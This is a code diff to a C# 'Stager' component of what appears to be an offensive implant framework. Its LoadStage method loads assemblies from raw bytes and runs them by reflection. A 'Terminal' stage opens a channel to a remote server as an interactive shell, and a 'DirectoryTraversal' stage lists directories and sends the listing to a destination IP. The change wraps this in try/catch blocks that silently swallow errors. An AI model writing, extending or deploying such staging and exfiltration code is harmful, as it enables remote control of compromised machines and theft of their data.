@@ -87,68 +87,74 @@ namespace Stager
         public int LoadStage(byte[] assembly, Dictionary<string, string> arguments)
         {
             ClearChannel channel;
-            Assembly s = Assembly.Load(assembly);
-            foreach(var type in s.GetTypes())
+            try
             {
-                if (type.FullName.Equals("Reno.Stages.Terminal"))
+                Assembly s = Assembly.Load(assembly);
+                foreach (var type in s.GetTypes())
                 {
-                    Assembly a = Assembly.Load(assembly);
-                    string server = arguments["server"];
-                    int port = 443;
-                    string compression = arguments["compression"];
-                    if (!Int32.TryParse(arguments["port"], out port))
+                    if (type.FullName.Equals("Reno.Stages.Terminal"))
                     {
-                        Console.WriteLine("[-] Error parsing port argument, using default of 443");
+                        //Assembly a = Assembly.Load(assembly);
+                        string server = arguments["server"];
+                        int port = 443;
+                        string compression = arguments["compression"];
+                        if (!Int32.TryParse(arguments["port"], out port))
+                        {
+                            Console.WriteLine("[-] Error parsing port argument, using default of 443");
+                        }
+                        channel = new ClearChannel(server, port, compression);
+                        if (channel.IsOpen())
+                        {
+                            object[] p = new object[1];
+                            p[0] = channel;
+                            var terminalInstance = Activator.CreateInstance(type, p);
+                            var executeTerminal = type.GetMethod("Execute");
+                            executeTerminal.Invoke(terminalInstance, null);
+                        }
                     }
-                    channel = new ClearChannel(server, port, compression);
-                    if (channel.IsOpen())
+                    else if (type.FullName.Equals("Reno.Stages.DirectoryTraversal"))
                     {
-                        object[] p = new object[1];
-                        p[0] = channel;
-                        var terminalInstance = Activator.CreateInstance(type, p);
-                        var executeTerminal = type.GetMethod("Execute");
-                        executeTerminal.Invoke(terminalInstance, null);
+                        //Assembly a = Assembly.Load(assembly);
+                        var traversal = Activator.CreateInstance(type, null);
+                        var execute = type.GetMethod("EnumerateDirectoryStructure");
+                        string dir = arguments["dir"];
+                        string format = arguments["format"];
+                        string dstip = arguments["dstip"];
+                        string compression = arguments["compression"];
+                        int port = 443;
+                        if (!Int32.TryParse(arguments["dstport"], out port))
+                        {
+                            Console.WriteLine("[-] Error parsing port argument, using default of 443");
+                        }
+                        channel = new ClearChannel(dstip, port, compression);
+                        object[] o = { dir, format };
+                        object output = execute.Invoke(traversal, o);
+                        string sOutput = output.ToString();
+                        channel.SendBytes(Encoding.UTF8.GetBytes(sOutput));
+                        Console.WriteLine(s);
+                        channel.Close();
                     }
-                }
-                else if (type.FullName.Equals("Reno.Stages.DirectoryTraversal"))
-                {
-                    Assembly a = Assembly.Load(assembly);
-                    var traversal = Activator.CreateInstance(type, null);
-                    var execute = type.GetMethod("EnumerateDirectoryStructure");
-                    string dir = arguments["dir"];
-                    string format = arguments["format"];
-                    string dstip = arguments["dstip"];
-                    string compression = arguments["compression"];
-                    int port = 443;
-                    if(!Int32.TryParse(arguments["dstport"], out port))
+                    else
                     {
-                        Console.WriteLine("[-] Error parsing port argument, using default of 443");
-                    }
-                    channel = new ClearChannel(dstip, port, compression);
-                    object[] o = { dir, format };
-                    object output = execute.Invoke(traversal, o);
-                    string sOutput = output.ToString();
-                    channel.SendBytes(Encoding.UTF8.GetBytes(sOutput));
-                    Console.WriteLine(s);
-                    channel.Close();
-                }
-                else
-                {
-                    Console.WriteLine("[*] Loaded Type {0}", type);
-                    object instance = Activator.CreateInstance(type);
-                    object[] args = new object[] { new string[] { "" } };
-                    try
-                    {
-                        type.GetMethod("Execute").Invoke(instance, null);
-                        return 1;
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("[-] Error executing command: " + e.Message);
-                        return -1;
+                        try
+                        {
+                            Console.WriteLine("[*] Loaded Type {0}", type);
+                            object instance = Activator.CreateInstance(type);
+                            object[] args = new object[] { new string[] { "" } };
+
+                            type.GetMethod("Execute").Invoke(instance, null);
+                            return 1;
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[-] Error executing command: " + e.Message);
+                            return -1;
+                        }
                     }
                 }
             }
+            catch (BadImageFormatException e) { }
+            catch (Exception e) { }
             return 1;
         }
         /// <summary>
